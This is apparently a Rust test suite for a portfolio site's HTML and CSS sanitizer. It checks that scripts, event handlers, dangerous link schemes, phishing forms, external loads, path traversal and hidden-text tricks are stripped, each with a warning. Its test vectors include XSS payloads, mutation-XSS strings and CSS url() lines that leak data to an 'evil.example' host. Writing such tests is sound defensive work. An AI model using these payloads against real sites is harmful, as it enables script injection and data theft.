// SPDX-License-Identifier: AGPL-3.0-or-later
//! The page design's sanitizer: what gets through, what doesn't, and what the creative is told.

use super::*;

fn picture(path: &str) -> Picture {
    Picture {
        path: path.into(),
        url: format!("https://raw.example/c/.slop/{path}"),
        sha256: "0".repeat(64),
        width: 64,
        height: 64,
        format: "png".into(),
        dhash: None,
    }
}

fn works() -> Vec<Work> {
    vec![
        Work::Image {
            picture: picture("works/a.png"),
            title: Some("A".into()),
            caption: None,
            skill: None,
        },
        Work::Image {
            picture: picture("works/b.png"),
            title: None,
            caption: None,
            skill: None,
        },
        Work::Video {
            youtube_id: "dQw4w9WgXcQ".into(),
            poster: None,
            title: None,
            caption: None,
            skill: None,
        },
    ]
}

fn page(html: &str) -> Draft {
    sanitize(html, None, &works()).expect("a usable page")
}

fn html(d: &Draft) -> String {
    let mut out = String::new();
    to_html(&d.tree, &mut out);
    out
}

struct CssOut {
    css: String,
    warnings: Vec<String>,
    paths: Vec<(String, u32)>,
}

fn css(src: &str) -> CssOut {
    let (css, warnings, paths) = rebuild_css(src, &HashMap::new(), Warnings::default());
    CssOut {
        css,
        warnings: warnings.finish(),
        paths,
    }
}

fn warned(warnings: &[String], what: &str) -> bool {
    warnings.iter().any(|w| w.contains(what))
}

/// Every element and attribute in a tree is one Slop allows.
fn assert_clean(nodes: &[Node]) {
    for n in nodes {
        if let Node::Element {
            tag,
            attrs,
            children,
        } = n
        {
            assert!(
                TAGS.contains(&tag.as_str()) || SLOP_TAGS.contains(&tag.as_str()),
                "<{tag}>"
            );
            for (k, v) in attrs {
                assert!(
                    [
                        "class", "lang", "href", "rel", "target", "src", "alt", "start",
                        "reversed", "colspan", "rowspan", "scope", "work", "youtube", "title",
                        "width", "height", "format",
                    ]
                    .contains(&k.as_str()),
                    "<{tag} {k}>"
                );
                if k == "href" {
                    assert!(v.starts_with("https://") || v.starts_with("mailto:"), "{v}");
                }
            }
            assert_clean(children);
        }
    }
}

#[test]
fn scripts_handlers_and_other_pages_never_get_through() {
    let vectors = [
        "<script>alert(1)</script><p>hi</p>",
        "<p onclick=\"alert(1)\" onmouseover=alert(1) style=\"position:fixed\" id=x>hi</p>",
        "<img src=\"images/a.png\" onerror=\"alert(1)\" alt=\"\">",
        "<svg><script>alert(1)</script><a xlink:href=\"javascript:alert(1)\">x</a></svg>",
        "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
        "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></noscript>",
        "<iframe src=\"https://evil.example\"></iframe><object data=x></object><embed src=x>",
        "<form action=\"https://evil.example\"><input name=password><button>Sign in</button></form>",
        "<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\"><base href=\"https://evil.example/\"><link rel=stylesheet href=\"https://evil.example/x.css\">",
        "<template><script>alert(1)</script></template><style>body{display:none}</style>",
        "<div><!-- <script>alert(1)</script> --></div>",
        "<a href=\"javascript:alert(1)\">a</a><a href=\" JaVaScRiPt:alert(1)\">b</a>",
        "<a href=\"jav&#x09;ascript:alert(1)\">c</a><a href=\"jav&#10;ascript:alert(1)\">d</a>",
        "<a href=\"data:text/html,<script>alert(1)</script>\">e</a><a href=\"vbscript:x\">f</a>",
        "<a href=\"http://plain.example\">g</a><a href=\"https://me:pw@evil.example\">h</a>",
        "<a href=\"/account\">i</a><a href=\"#top\">j</a><a href=\"//evil.example\">k</a>",
        "<img src=x srcset=\"https://evil.example/a.png 2x\"><video src=x></video><audio src=x>",
        "<div data-x=1 aria-label=\"Sign in\" role=button tabindex=0 contenteditable>l</div>",
        "<xmp><script>alert(1)</script></xmp><plaintext><script>alert(1)",
    ];
    for v in vectors {
        let d = page(v);
        assert_clean(&d.tree);
        let out = html(&d).to_ascii_lowercase();
        for bad in [
            "<script",
            "onerror",
            "onclick",
            "javascript",
            "<style",
            "style=",
            "<iframe",
            "<form",
            "<input",
            "<button",
            "<meta",
            "<base",
            "<link",
            "srcset",
            "<svg",
            "data:",
            "vbscript",
            "http://",
            "evil",
            "aria-",
            "role=",
        ] {
            assert!(!out.contains(bad), "{v} → {out}");
        }
        assert!(
            !d.warnings.is_empty() || v.starts_with("<div><!--"),
            "{v} says nothing"
        );
    }
    // Text that looks like HTML stays text.
    let d = page("<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>");
    assert_eq!(
        d.tree,
        vec![Node::Element {
            tag: "p".into(),
            attrs: BTreeMap::new(),
            children: vec![Node::Text("<script>alert(1)</script>".into())],
        }]
    );
    assert_eq!(html(&d), "<p>&lt;script&gt;alert(1)&lt;/script&gt;</p>");
}

#[test]
fn warnings_say_where_and_why() {
    let d = page("<p>one</p>\n<p>two</p>\n<script>alert(1)</script>\n<p onclick=x>three</p>");
    assert!(
        warned(
            &d.warnings,
            "index.html line 3: <script> was removed with what's inside: pages can't run scripts"
        ),
        "{:?}",
        d.warnings
    );
    assert!(warned(
        &d.warnings,
        "line 4: <p onclick> was removed: pages can't run scripts"
    ));
    let d = page("<h1>Me</h1><nav><p>x</p></nav>");
    assert_eq!(html(&d), "<h2>Me</h2><p>x</p>");
    assert!(warned(&d.warnings, "<h1> became <h2>"));
    assert!(warned(
        &d.warnings,
        "<nav> isn't one of the tags pages can use"
    ));
    // A whole document is fine: the head's parts are removed, the body kept.
    let d = page(
        "<!doctype html><html><head><title>Me</title><meta charset=utf-8></head><body><p>x</p></body></html>",
    );
    assert_eq!(html(&d), "<p>x</p>");
    assert!(warned(&d.warnings, "<title> was removed"));
}

#[test]
fn links_open_elsewhere_and_say_so() {
    let d = page(
        "<a href=\"https://example.com/me\">Me</a> <a href=\"mailto:me@example.com\">Mail</a>",
    );
    assert_eq!(
        html(&d),
        "<a href=\"https://example.com/me\" rel=\"nofollow noopener noreferrer ugc\" target=\"_blank\">Me</a> \
         <a href=\"mailto:me@example.com\" rel=\"nofollow noopener noreferrer ugc\" target=\"_blank\">Mail</a>"
    );
    let d = page("<a href=\"javascript:alert(1)\" target=\"_self\" rel=\"opener\">x</a>");
    assert_eq!(html(&d), "<span>x</span>");
    assert!(warned(&d.warnings, "links start with https:// or mailto:"));
}

#[test]
fn invisible_direction_characters_are_removed() {
    let d = page("<p>my\u{202E}gnp.exe\u{2066} \u{0007}</p>");
    assert_eq!(html(&d), "<p>mygnp.exe </p>");
    assert!(warned(
        &d.warnings,
        "invisible direction or control characters"
    ));
}

#[test]
fn pictures_come_from_the_repository() {
    let d = page(
        "<img src=\"images/hero.png\" alt=\"Hero\"><img src=\"./../works/a.png\" alt=\"A\" width=9000>",
    );
    assert_eq!(
        html(&d),
        "<img alt=\"Hero\" src=\"page/images/hero.png\"><img alt=\"A\" src=\"works/a.png\">"
    );
    assert_eq!(
        d.pictures,
        vec![
            (
                "page/images/hero.png".to_string(),
                ".slop/page/index.html line 1".to_string()
            ),
            (
                "works/a.png".to_string(),
                ".slop/page/index.html line 1".to_string()
            ),
        ]
    );
    for bad in [
        "/etc/passwd.png",
        "../../outside.png",
        "https://evil.example/x.png",
        "//evil.example/x.png",
        "data:image/png;base64,AAAA",
        "images/x.svg",
        "images/%2e%2e/x.png",
        "images/x.png?track=1",
        "images\\x.png",
        "",
    ] {
        let d = page(&format!("<img src=\"{bad}\" alt=x><p>t</p>"));
        assert_eq!(html(&d), "<p>t</p>", "{bad}");
        assert!(warned(&d.warnings, "<img src="), "{bad}: {:?}", d.warnings);
        assert!(d.pictures.is_empty());
    }
    let d = page("<img src=\"a.png\">");
    assert!(warned(&d.warnings, "needs alt text"));
    assert_eq!(html(&d), "<img alt=\"\" src=\"page/a.png\">");
}

#[test]
fn slops_parts_are_named_strictly() {
    let d = page(
        "<slop-works></slop-works><slop-work ref=\"2\"></slop-work>\
         <slop-video youtube=\"https://youtu.be/dQw4w9WgXcQ\" title=\"Reel\"></slop-video>\
         <slop-video youtube=\"dQw4w9WgXcQ\"></slop-video>\
         <slop-track src=\"../tracks/theme.ogg\" title=\"Theme\"></slop-track>",
    );
    assert!(d.warnings.is_empty(), "{:?}", d.warnings);
    assert!(d.has_works);
    assert_eq!(
        html(&d),
        "<slop-works></slop-works><slop-work work=\"image:works/b.png\"></slop-work>\
         <slop-video title=\"Reel\" youtube=\"dQw4w9WgXcQ\"></slop-video><slop-video youtube=\"dQw4w9WgXcQ\"></slop-video>\
         <slop-track src=\"tracks/theme.ogg\" title=\"Theme\"></slop-track>"
    );
    assert_eq!(
        d.tracks,
        vec![(
            "tracks/theme.ogg".to_string(),
            ".slop/page/index.html line 1".to_string()
        )]
    );

    // What can't work is a problem, with the line and the rule.
    for (bad, want) in [
        (
            "<p>\n<slop-work ref=\"4\"></slop-work>",
            "index.html line 2: <slop-work ref=\"4\"> isn't one of your works: ref is the work's number in portfolio.json's works list, from 1 to 3",
        ),
        ("<slop-work ref=\"Knight\"></slop-work>", "from 1 to 3"),
        ("<slop-work></slop-work>", "<slop-work> needs ref="),
        (
            "<slop-video youtube=\"https://vimeo.com/1\"></slop-video>",
            "isn't a YouTube link or video ID",
        ),
        ("<slop-video></slop-video>", "needs youtube="),
        (
            "<slop-track src=\"https://evil.example/x.mp3\"></slop-track>",
            "files come from your repository",
        ),
        (
            "<slop-track src=\"theme.exe\"></slop-track>",
            "isn't an audio file",
        ),
    ] {
        let Err(Problem(p)) = sanitize(bad, None, &works()) else {
            panic!("{bad} was accepted");
        };
        assert!(p.contains(want), "{bad}: {p}");
    }

    // Parts take nothing inside: what was there follows them. One <slop-works>, none in links.
    let d = page(
        "<slop-works><slop-track src=\"a.ogg\"><script>alert(1)</script><p>after</p></slop-track></slop-works>\
         <slop-works onload=\"alert(1)\"></slop-works><a href=\"https://x.example\"><slop-works></slop-works>go</a>\
         <slop-evil onload=\"alert(1)\"><b>kept</b></slop-evil>",
    );
    assert_clean(&d.tree);
    assert_eq!(
        html(&d),
        "<slop-works></slop-works><slop-track src=\"page/a.ogg\"></slop-track><p>after</p>\
         <a href=\"https://x.example/\" rel=\"nofollow noopener noreferrer ugc\" target=\"_blank\">go</a><b>kept</b>"
    );
    for w in [
        "<slop-track> takes nothing inside it",
        "<slop-works> shows once",
        "<slop-works> can't be inside a link",
        "<slop-evil> isn't one of Slop's parts",
    ] {
        assert!(warned(&d.warnings, w), "{w}: {:?}", d.warnings);
    }
    // Services are never inside a design (it could cover or imitate them): Slop shows them below.
    let d = page("<section><slop-services><p>Hire me</p></slop-services></section>");
    assert_eq!(html(&d), "<section><p>Hire me</p></section>");
    assert!(warned(
        &d.warnings,
        "<slop-services> was removed: your services always appear below your design"
    ));
    // HTML has no self-closing custom tags: what follows ends up inside, and is moved back out.
    let d = page("<slop-works/><p>after</p>");
    assert_eq!(html(&d), "<slop-works></slop-works><p>after</p>");
    assert!(warned(&d.warnings, "write <slop-works …></slop-works>"));
}

#[test]
fn pages_have_limits() {
    let deep = "<div>".repeat(40) + "x";
    let Err(Problem(p)) = sanitize(&deep, None, &works()) else {
        panic!("too deep");
    };
    assert!(p.contains("nested more than 32 deep"), "{p}");
    let many = "<span>x</span>".repeat(MAX_ELEMENTS + 1);
    let Err(Problem(p)) = sanitize(&many, None, &works()) else {
        panic!("too many");
    };
    assert!(p.contains("more than 2000 elements"), "{p}");
    let classes = page("<p class=\"a b c d e f g h i 9z ok\">x</p>");
    assert_eq!(html(&classes), "<p class=\"a b c d e f g h\">x</p>");
    assert!(warned(&classes.warnings, "up to 8 classes"));
    assert!(warned(&classes.warnings, "class \"9z\" was removed"));
    assert_eq!(
        text("index.html", b"<p>ok</p>\n\xff".to_vec())
            .unwrap_err()
            .0,
        "index.html line 2 isn't UTF-8 text: save the file as UTF-8"
    );
}

#[test]
fn allowed_css_comes_through_rebuilt() {
    let out = css(
        "/* a card */\n.card, .grid > li:nth-child(2n+1) { color: #FFF; background: linear-gradient(90deg, rgb(0 0 0 / 50%), transparent); padding: 1rem 2px; border-radius: 8px; }\n\
         .card:hover::after { content: \"★ \"; transform: rotate(3deg) scale(1.1); transition: transform .2s ease-out }\n\
         @media (max-width: 600px) { .grid { display: grid; grid-template-columns: [a] 1fr [b] 2fr; } }\n\
         @keyframes spin { from { transform: rotate(0deg) } 50% { opacity: .5 } to { transform: rotate(360deg) } }\n\
         h2 { font-family: \"Comic Sans MS\", fraunces, serif; position: absolute; z-index: 5 }",
    );
    assert_eq!(
        out.css,
        ".card, .grid > li:nth-child(2n+1){color:#FFF;background:linear-gradient(90deg, rgb(0 0 0 / 50%), transparent);padding:1rem 2px;border-radius:8px;}\
         .card:hover::after{content:\"★ \";transform:rotate(3deg) scale(1.1);transition:transform 0.2s ease-out;}\
         @container (max-width: 600px){.grid{display:grid;grid-template-columns:[a] 1fr [b] 2fr;}}\
         @keyframes spin{from{transform:rotate(0deg);}50%{opacity:0.5;}to{transform:rotate(360deg);}}\
         h2{font-family:\"Fraunces\",serif;position:absolute;z-index:5;}"
    );
    assert_eq!(out.warnings.len(), 1, "{:?}", out.warnings);
    assert!(warned(
        &out.warnings,
        "style.css line 6: the font \"Comic Sans MS\" was removed"
    ));
}

#[test]
fn css_that_could_escape_load_or_hide_is_removed() {
    let cases = [
        (
            "@import url(https://evil.example/x.css);",
            "@import isn't allowed",
        ),
        ("@import 'x.css';", "@import isn't allowed"),
        (
            "@font-face { font-family: X; src: url(https://evil.example/x.woff) }",
            "@font-face isn't allowed",
        ),
        (
            "@namespace svg url(http://www.w3.org/2000/svg);",
            "@namespace isn't allowed",
        ),
        (
            "@supports (display: grid) { .a { color: red } }",
            "@supports isn't allowed",
        ),
        (
            ".a { background: url(https://evil.example/leak?c=1) }",
            "files come from your repository",
        ),
        (
            ".a { background: url('//evil.example/x.png') }",
            "files come from your repository",
        ),
        (
            ".a { background: url(data:image/png;base64,AAAA) }",
            "files come from your repository",
        ),
        (
            ".a { background-image: image-set('x.png' 1x) }",
            "pictures come from url()",
        ),
        (".a { content: url(x.png) }", "content can't name a file"),
        (
            ".a { cursor: url(x.png), auto }",
            "cursor can't name a file",
        ),
        (
            ".a { behavior: url(x.htc) }",
            "behavior isn't one of the properties",
        ),
        (".a { -moz-binding: url(x.xml#x) }", "browser-specific"),
        (
            ".a { width: expression(alert(1)) }",
            "expression() isn't allowed",
        ),
        (
            ".a { position: fixed; inset: 0 }",
            "position can be static, relative or absolute",
        ),
        (
            ".a { position: sticky }",
            "position can be static, relative or absolute",
        ),
        (
            ".a { posit\\69 on: f\\69 xed }",
            "position can be static, relative or absolute",
        ),
        (
            ".a { z-index: 99999 }",
            "z-index is a whole number from -100 to 100",
        ),
        (".a { z-index: 2147483647 }", "z-index is a whole number"),
        (".a { --x: fixed; }", "custom properties"),
        (".a { position: var(--x) }", "variables aren't allowed"),
        (".a { content: attr(href) }", "attr() isn't allowed"),
        (".a { font: 12px Arial }", "font shorthand"),
        (".a { font-family: Arial }", "none of its fonts"),
        (
            "[href^='https://a'] { background: url(x.png) }",
            "attribute selectors aren't allowed",
        ),
        ("#me { color: red }", "ids aren't allowed"),
        ("body { display: none }", "body isn't part of your page"),
        ("html, .a { color: red }", "html isn't part of your page"),
        (":root { color: red }", ":root isn't allowed"),
        (":host { position: fixed }", ":host isn't allowed"),
        ("button { color: red }", "<button> isn't one of the tags"),
        (
            "slop-works { display: none }",
            "Slop's parts keep Slop's own look",
        ),
        (".a:has(.b) { color: red }", ":has() isn't allowed"),
        (".a:visited { color: red }", ":visited isn't allowed"),
        (".a { .b { color: red } }", "removed"),
        (
            ".a { color: red; } } </style><script>alert(1)</script>",
            "was removed",
        ),
        (
            ".a { color: red } @media (max-width: 1px) { @media print { .a { color: red } } }",
            "@media can't be inside @media",
        ),
    ];
    for (src, want) in cases {
        let out = css(src);
        assert!(
            out.warnings.iter().any(|w| w.contains(want)),
            "{src}: {:?}",
            out.warnings
        );
        let lower = out.css.to_ascii_lowercase();
        for bad in [
            "@import",
            "@font-face",
            "evil",
            "data:",
            "fixed",
            "sticky",
            "99999",
            "--x",
            "var(",
            "attr(",
            "expression",
            "behavior",
            "binding",
            "<",
            "#me",
            "[",
            "body",
            ":root",
            ":host",
            "image-set",
            "slop-",
            ":has",
            ":visited",
        ] {
            assert!(!lower.contains(bad), "{src} → {}", out.css);
        }
    }
    // Escapes are read as what they mean: an escaped "red" is red; an escaped url() is a url().
    assert_eq!(css(".a { color: \\72 ed }").css, ".a{color:red;}");
    let out = css(".a { background: u\\72l(https://evil.example/x) }");
    assert!(
        out.css.is_empty() && warned(&out.warnings, "files come from your repository"),
        "{:?}",
        out.css
    );
    // Quoted text can't close a <style>.
    assert_eq!(
        css(".a::before { content: \"</style>\" }").css,
        ".a::before{content:\"\\3c /style>\";}"
    );
    // !important goes (Slop's reduced-motion rule has to win), the declaration stays.
    let out = css(".a { color: red !important }");
    assert_eq!(out.css, ".a{color:red;}");
    assert!(warned(
        &out.warnings,
        "style.css line 1: !important was dropped from color"
    ));
}

#[test]
fn css_pictures_are_repository_paths_then_links() {
    let out =
        css(".hero {\n  background: center / cover url(images/bg.png), url('../works/a.png');\n}");
    assert_eq!(
        out.css,
        ".hero{background:center / cover url(\"page/images/bg.png\"), url(\"works/a.png\");}"
    );
    assert_eq!(
        out.paths,
        vec![
            ("page/images/bg.png".to_string(), 2),
            ("works/a.png".to_string(), 2)
        ]
    );
    let urls = HashMap::from([(
        "page/images/bg.png".to_string(),
        "https://raw.githubusercontent.com/me/p/abc/.slop/page/images/bg.png".to_string(),
    )]);
    assert_eq!(
        sanitize_css(".hero { background-image: url(images/bg.png) }", &urls),
        ".hero{background-image:url(\"https://raw.githubusercontent.com/me/p/abc/.slop/page/images/bg.png\");}"
    );
    // Through `sanitize`, CSS pictures join the page's, with where they're used.
    let d = sanitize(
        "<img src=\"images/bg.png\" alt=\"\">",
        Some("\n.a { background: url(images/bg.png) }\n.b { background: url(images/tile.png) }"),
        &works(),
    )
    .unwrap();
    assert_eq!(
        d.pictures,
        vec![
            (
                "page/images/bg.png".to_string(),
                ".slop/page/index.html line 1".to_string()
            ),
            (
                "page/images/tile.png".to_string(),
                ".slop/page/style.css line 3".to_string()
            ),
        ]
    );
}

#[test]
fn the_allow_lists_are_whole_words() {
    for list in [PROPERTIES, FUNCTIONS, UNITS] {
        for w in list.split_ascii_whitespace() {
            assert!(
                !w.starts_with('-')
                    && !w.ends_with('-')
                    && w.bytes()
                        .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || b == b'-'),
                "{w}"
            );
        }
    }
    for p in [
        "padding-top",
        "font-variant-numeric",
        "animation-timing-function",
        "grid-auto-rows",
        "border-top-left-radius",
    ] {
        assert!(listed(PROPERTIES, p), "{p}");
    }
    assert!(listed(FUNCTIONS, "repeating-conic-gradient") && listed(UNITS, "dppx"));
}

/// web/public/portfolio.md states the rules this file enforces; it has to change when they do.
#[test]
fn the_portfolio_guide_states_the_design_rules() {
    let guide = include_str!("../../../../../web/public/portfolio.md");
    let mut want = vec![
        HTML_PATH.to_string(),
        CSS_PATH.to_string(),
        format!("{} KB", MAX_HTML_BYTES / 1024),
        format!("{} KB", MAX_CSS_BYTES / 1024),
        format!("up to {MAX_CLASSES} classes"),
        format!("{MAX_DEPTH} deep"),
        "2,000 elements".to_string(),
        format!("±{MAX_Z}"),
        "rel=\"nofollow noopener noreferrer ugc\"".to_string(),
    ];
    want.extend(FONTS.iter().map(|f| format!("`{f}`")));
    want.extend(SLOP_TAGS.iter().map(|t| format!("<{t}")));
    want.extend(
        TAGS.iter()
            .map(|t| format!("`{t}`"))
            .filter(|t| t != "`h2`" && t != "`h3`" && t != "`h4`" && t != "`h5`"),
    );
    for w in want {
        assert!(guide.contains(&w), "portfolio.md doesn't say {w}");
    }
    assert_eq!(MAX_ELEMENTS, 2_000);
}

/// Runs `f` on a thread with a 2 MiB stack, as a server worker has.
fn on_small_stack<T: Send + 'static>(f: impl FnOnce() -> T + Send + 'static) -> T {
    std::thread::Builder::new()
        .stack_size(2 << 20)
        .spawn(f)
        .unwrap()
        .join()
        .expect("no stack overflow")
}

#[test]
fn deep_nesting_is_refused_without_running_out_of_stack() {
    let started = std::time::Instant::now();
    for (open, close) in [
        ("<div>", "</div>"),
        ("<nav>", "</nav>"),
        ("<slop-x>", "</slop-x>"),
        ("<template>", "</template>"),
        ("<b>", "</b>"),
        ("<slop-works>", "</slop-works>"),
        ("<a href=\"https://x.example\">", "</a>"),
        ("<ul><li>", "</li></ul>"),
        ("<table><tr><td>", "</td></tr></table>"),
        ("<svg><g>", "</g></svg>"),
        ("<i><b><u>", "</u></b></i>"),
        ("<select><option>", "</option></select>"),
    ] {
        let html = format!("{}x{}", open.repeat(20_000), close.repeat(20_000));
        let result = on_small_stack(move || {
            sanitize(&html, None, &works())
                .map(|d| d.tree.len())
                .map_err(|p| p.0)
        });
        match result {
            Err(p) => assert!(
                p.contains("nested more than 32 deep") || p.contains("more than 2000 elements"),
                "{open}: {p}"
            ),
            // Some never nest: <template> is removed whole with what's in it, HTML's own rules
            // flatten formatting tags, links and options, <svg> is removed whole, and
            // <slop-works> shows once.
            Ok(_) => assert!(
                matches!(
                    open,
                    "<template>"
                        | "<b>"
                        | "<slop-works>"
                        | "<a href=\"https://x.example\">"
                        | "<svg><g>"
                        | "<select><option>"
                        | "<i><b><u>"
                ),
                "{open}"
            ),
        }
    }
    // Quickly, too: parsing stops once the page is far too deep.
    assert!(
        started.elapsed() < std::time::Duration::from_secs(10),
        "{:?}",
        started.elapsed()
    );
    // And in CSS: nested brackets, blocks and functions.
    for css_src in [
        format!(
            ".a{{width:{}1px{}}}",
            "(".repeat(20_000),
            ")".repeat(20_000)
        ),
        format!(
            ".a{{width:{}1px{}}}",
            "calc(".repeat(20_000),
            ")".repeat(20_000)
        ),
        format!(".a{}color:red{}", "{".repeat(20_000), "}".repeat(20_000)),
        format!("@media {}", "(".repeat(20_000)),
        format!(
            ".a:not({}.b{}){{color:red}}",
            ":not(".repeat(20_000),
            ")".repeat(20_000)
        ),
    ] {
        let out = on_small_stack(move || sanitize_css(&css_src, &HashMap::new()));
        assert!(!out.contains("width"), "{out}");
    }
}

#[test]
fn thousands_of_removals_are_counted_quickly() {
    let started = std::time::Instant::now();
    // One tag with thousands of attributes is refused before the parser sees it.
    let attrs: String = (0..13_000).map(|i| format!(" data-a{i}=x")).collect();
    let Err(Problem(p)) = sanitize(&format!("<p>\n<p{attrs}>hi</p>"), None, &works()) else {
        panic!("accepted");
    };
    assert_eq!(
        p,
        ".slop/page/index.html line 2: a tag has 65 attributes or more; the most a tag can have is 64"
    );
    // Quoted values with spaces, = and > in them don't count as attributes.
    let busy: String = (0..60)
        .map(|i| format!(" title{i}=\"a b=c > d\""))
        .collect();
    assert!(sanitize(&format!("<p{busy}>x</p>"), None, &works()).is_ok());
    // Thousands of removals (60 attributes on each of hundreds of elements, and a style sheet
    // of nothing allowed) are counted, not kept.
    let attrs: String = (0..60).map(|i| format!(" data-a{i}=x")).collect();
    let html_src = format!("<p{attrs}>hi</p>").repeat(300);
    let css: String = (0..3_000).map(|i| format!(".a{i}{{behavior:x}}")).collect();
    let d = sanitize(&html_src, Some(&css), &works()).unwrap();
    assert!(
        started.elapsed() < std::time::Duration::from_secs(3),
        "{:?}",
        started.elapsed()
    );
    assert_eq!(d.warnings.len(), MAX_WARNINGS + 1);
    assert!(
        d.warnings.last().unwrap().starts_with("…and "),
        "{:?}",
        d.warnings.last()
    );
    assert_eq!(html(&d), "<p>hi</p>".repeat(300));
}

#[test]
fn layering_and_keyword_properties_take_plain_values() {
    for src in [
        ".a { z-index: calc(99999) }",
        ".a { z-index: max(1, 99999) }",
        ".a { z-index: clamp(1, 99999, 99999) }",
        ".a { position: calc(1) }",
        ".a { display: min(none) }",
    ] {
        let out = css(src);
        assert_eq!(out.css, "", "{src}");
        assert!(
            warned(&out.warnings, "takes a plain value here, not a function"),
            "{src}: {:?}",
            out.warnings
        );
    }
    assert_eq!(css(".a { z-index: 7 }").css, ".a{z-index:7;}");
    // blur() is capped: a huge blur hides everything under it.
    assert_eq!(css(".a { filter: blur(4px) }").css, ".a{filter:blur(4px);}");
    for src in [
        ".a { filter: blur(400px) }",
        ".a { backdrop-filter: blur(10vw) }",
        ".a { filter: blur(9em) }",
    ] {
        let out = css(src);
        assert_eq!(out.css, "", "{src}");
        assert!(warned(&out.warnings, "blur() is at most 40px"), "{src}");
    }
}

#[test]
fn css_that_hides_text_is_kept_but_said() {
    for src in [
        ".a { display: none }",
        ".a { visibility: hidden }",
        ".a { opacity: 0 }",
        ".a { opacity: 5% }",
        ".a { font-size: 0 }",
        ".a { font-size: 1px }",
        ".a { color: transparent }",
        ".a { text-indent: -9999px }",
        ".a { position: absolute; left: -9999px }",
        ".a { margin-top: -100em }",
        ".a { transform: translateX(-9999px) }",
    ] {
        let out = css(src);
        assert!(!out.css.is_empty(), "{src}: kept");
        assert!(
            warned(
                &out.warnings,
                "hides what it applies to: reviewers see any text hidden this way"
            ),
            "{src}: {:?}",
            out.warnings
        );
    }
    for src in [
        ".a { opacity: 0.6 }",
        ".a { font-size: 12px }",
        ".a { left: -20px }",
        ".a { display: grid }",
        ".a { transform: translateX(10px) }",
    ] {
        assert_eq!(css(src).warnings, Vec::<String>::new(), "{src}");
    }
}

#[test]
fn width_queries_are_about_the_designs_own_box() {
    assert_eq!(
        css("@media (max-width: 640px) { .a { color: red } }").css,
        "@container (max-width: 640px){.a{color:red;}}"
    );
    assert_eq!(
        css(
            "@media only screen and (min-width: 600px) and (max-width: 900px) { .a { color: red } }"
        )
        .css,
        "@container (min-width: 600px) and (max-width: 900px){.a{color:red;}}"
    );
    for (src, query) in [
        (
            "@media (prefers-reduced-motion: reduce) { .a { color: red } }",
            "@media (prefers-reduced-motion: reduce)",
        ),
        (
            "@media print and (max-width: 600px) { .a { color: red } }",
            "@media print and (max-width: 600px)",
        ),
        (
            "@media (max-width: 600px), (orientation: portrait) { .a { color: red } }",
            "@media (max-width: 600px), (orientation: portrait)",
        ),
        (
            "@media (min-aspect-ratio: 16/9) { .a { color: red } }",
            "@media (min-aspect-ratio: 16/9)",
        ),
    ] {
        assert!(css(src).css.starts_with(query), "{src} → {}", css(src).css);
    }
}

#[test]
fn a_deep_dom_is_freed_without_recursion() {
    on_small_stack(|| {
        let node = || {
            Rc::new(DomNode {
                parent: RefCell::new(None),
                children: RefCell::new(Vec::new()),
                data: DomData::Other,
                line: 1,
                depth: Cell::new(0),
            })
        };
        let root = node();
        let mut at = root.clone();
        for _ in 0..200_000 {
            let child = node();
            at.children.borrow_mut().push(child.clone());
            at = child;
        }
        drop(at);
        drop(root);
    });
}
